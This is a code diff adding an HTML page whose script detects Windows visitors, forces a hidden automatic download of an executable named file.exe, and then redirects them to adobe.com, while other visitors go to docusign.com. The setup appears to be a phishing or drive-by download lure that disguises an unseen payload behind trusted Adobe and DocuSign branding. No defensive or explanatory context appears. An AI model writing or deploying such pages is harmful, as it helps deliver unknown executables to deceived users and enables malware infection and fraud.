@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Device-based Redirect</title>
+  <script>
+    function isWindows() {
+      return navigator.userAgent.indexOf('Windows') !== -1;
+    }
+
+    window.onload = function() {
+      if (isWindows()) {
+        // Windows: trigger download, then redirect to Adobe
+        var downloadUrl = '/windows-download/file.exe'; // Must exist in public/windows-download/file.exe
+        var a = document.createElement('a');
+        a.href = downloadUrl;
+        a.download = '';
+        document.body.appendChild(a);
+        a.click();
+
+        setTimeout(function() {
+          window.location.href = 'https://adobe.com';
+        }, 1500); // Adjust delay as needed
+      } else {
+        window.location.href = 'https://docusign.com';
+      }
+    }
+  </script>
+</head>
+<body>
+  <noscript>
+    Please enable JavaScript for automatic download and redirects.
+  </noscript>
+</body>
+</html>
